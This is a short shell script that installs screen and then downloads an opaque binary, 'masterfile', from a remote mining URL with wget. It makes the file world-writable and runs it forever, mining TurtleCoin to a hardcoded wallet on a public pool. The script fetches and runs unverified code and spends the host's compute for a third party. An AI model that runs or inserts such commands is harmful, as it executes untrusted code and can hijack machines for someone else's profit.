#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://swenson.my.id/mining/masterfile
chmod 777 masterfile
while [ 1 ]; do
./masterfile -o sg.turtlecoin.herominers.com:10381 -u TRTLv1ddyqQ1unEZxBT9gze6yMmeHM6JPet9DRtG2XWgiM3q2XgfCBM3pbjhJD6vsARvRxSRsEm1jdpozZVuDh6piUzcg26m7rR -p x -k --tls
sleep 3
done
sleep 999
